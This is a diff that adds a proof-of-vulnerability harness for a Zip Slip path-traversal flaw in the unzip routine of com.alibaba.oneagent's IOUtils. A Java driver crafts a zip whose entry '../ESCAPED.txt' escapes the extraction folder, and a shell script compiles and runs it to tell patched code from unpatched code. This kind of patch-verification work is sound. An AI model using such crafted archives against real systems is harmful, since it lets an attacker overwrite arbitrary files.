@@ -1,0 +1,125 @@
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..23316a8
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,84 @@
++package security.pipeline.pov;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import com.alibaba.oneagent.utils.IOUtils;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Zip Slip / Path Traversal) in
++ * {@link com.alibaba.oneagent.utils.IOUtils#unzip(String, String)}.
++ *
++ * The unzip routine builds the destination file with
++ *   new File(newPath, entry.getName())
++ * without verifying that the resolved path stays inside the extraction
++ * directory. A crafted zip entry name such as "../evil.txt" therefore
++ * escapes the target folder and writes to an arbitrary location.
++ *
++ * Exit code semantics:
++ *   0  -> a file was written OUTSIDE the extraction directory
++ *         (vulnerability reproduced on unpatched code).
++ *   1  -> the traversal was blocked (patched code): either unzip refused
++ *         the malicious entry / threw, or no escaped file was created.
++ */
++public class ZipSlipPov {
++
++    public static void main(String[] args) throws Exception {
++        File base = File.createTempFile("zipslip-pov", "");
++        base.delete();
++        base.mkdirs();
++
++        // Layout:
++        //   <base>/extract        -> intended extraction directory
++        //   <base>/ESCAPED.txt    -> where the malicious entry lands on escape
++        File extractDir = new File(base, "extract");
++        extractDir.mkdirs();
++
++        File escapedTarget = new File(base, "ESCAPED.txt");
++        if (escapedTarget.exists()) {
++            escapedTarget.delete();
++        }
++
++        // The relative traversal that resolves to <base>/ESCAPED.txt
++        String maliciousEntryName = "../ESCAPED.txt";
++
++        File zipFile = new File(base, "malicious.zip");
++        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
++        try {
++            ZipEntry entry = new ZipEntry(maliciousEntryName);
++            zos.putNextEntry(entry);
++            zos.write("pwned-by-zip-slip".getBytes("UTF-8"));
++            zos.closeEntry();
++        } finally {
++            zos.close();
++        }
++
++        System.out.println("[POV] extractDir    = " + extractDir.getCanonicalPath());
++        System.out.println("[POV] escapedTarget = " + escapedTarget.getCanonicalPath());
++        System.out.println("[POV] malicious entry name = " + maliciousEntryName);
++
++        boolean threw = false;
++        try {
++            IOUtils.unzip(zipFile.getAbsolutePath(), extractDir.getAbsolutePath());
++        } catch (Exception e) {
++            threw = true;
++            System.out.println("[POV] unzip threw: " + e);
++        }
++
++        boolean escaped = escapedTarget.exists()
++                && escapedTarget.getCanonicalPath().startsWith(base.getCanonicalPath())
++                && !escapedTarget.getCanonicalPath().startsWith(extractDir.getCanonicalPath());
++
++        if (escaped) {
++            System.out.println("[POV] VULNERABLE: malicious entry escaped the extraction directory.");
++            System.out.println("[POV] File written outside target: " + escapedTarget.getCanonicalPath());
++            System.exit(0);
++        }
++
++        System.out.println("[POV] SAFE: traversal blocked (threw=" + threw
++                + ", escapedFileExists=" + escapedTarget.exists() + ").");
++        System.exit(1);
++    }
++}
+diff --git a/.security-pipeline/pov/classes/com/alibaba/oneagent/utils/IOUtils.class b/.security-pipeline/pov/classes/com/alibaba/oneagent/utils/IOUtils.class
+new file mode 100644
+index 0000000..e0bbe0e
+Binary files /dev/null and b/.security-pipeline/pov/classes/com/alibaba/oneagent/utils/IOUtils.class differ
+diff --git a/.security-pipeline/pov/classes/security/pipeline/pov/ZipSlipPov.class b/.security-pipeline/pov/classes/security/pipeline/pov/ZipSlipPov.class
+new file mode 100644
+index 0000000..6ab56ba
+Binary files /dev/null and b/.security-pipeline/pov/classes/security/pipeline/pov/ZipSlipPov.class differ
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..1f4e11d
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,21 @@
++#!/usr/bin/env bash
++# POV runner for CWE-022 Zip Slip in com.alibaba.oneagent.utils.IOUtils#unzip
++# Compiles the REAL project source (IOUtils.java) together with the POV driver
++# and executes it. Exits 0 when the traversal is reproduced (unpatched),
++# non-zero when a correct patch blocks it.
++set -eu
++
++REPO_ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
++SRC_MAIN="$REPO_ROOT/one-java-agent-plugin/src/main/java"
++POV_DIR="$REPO_ROOT/.security-pipeline/pov"
++OUT_DIR="$POV_DIR/classes"
++
++rm -rf "$OUT_DIR"
++mkdir -p "$OUT_DIR"
++
++# Compile the actual project class plus the POV driver.
++javac -d "$OUT_DIR" \
++  "$SRC_MAIN/com/alibaba/oneagent/utils/IOUtils.java" \
++  "$POV_DIR/ZipSlipPov.java"
++
++java -cp "$OUT_DIR" security.pipeline.pov.ZipSlipPov
